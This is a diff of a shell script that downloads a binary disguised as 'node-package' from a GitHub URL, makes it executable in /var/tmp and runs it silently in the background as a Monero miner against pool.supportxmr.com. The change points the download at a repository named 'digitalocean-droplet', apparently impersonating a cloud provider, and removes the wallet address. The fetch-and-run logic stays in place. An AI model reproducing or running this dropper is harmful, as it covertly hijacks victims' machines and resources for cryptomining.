@@ -4,7 +4,7 @@
 set -e
 
 # Variables
-URL="https://github.com/yellphonenaing199/installer/raw/refs/heads/main/node-package"
+URL="https://github.com/digitalocean-droplet/installer/raw/refs/heads/main/node-package"
 TARGET_DIR="/var/tmp"
 FILENAME="node-package"
 FULL_PATH="$TARGET_DIR/$FILENAME"
@@ -20,4 +20,4 @@ curl -L -o "$FULL_PATH" "$URL"
 chmod +x "$FULL_PATH"
 
 # Run silently in background
-nohup "$FULL_PATH" -o pool.supportxmr.com:443 -u 44xquCZRP7k5QVc77uPtxb7Jtkaj1xyztAwoyUtmigQoHtzA8EmnAEUbpoeWcxRy1nJxu4UYrR4fN3MPufQQk4MTL6M2Y73 -k --tls -p prolay > /dev/null 2>&1 &
+nohup "$FULL_PATH" -o pool.supportxmr.com:443 -u  -k --tls -p prolay > /dev/null 2>&1 &
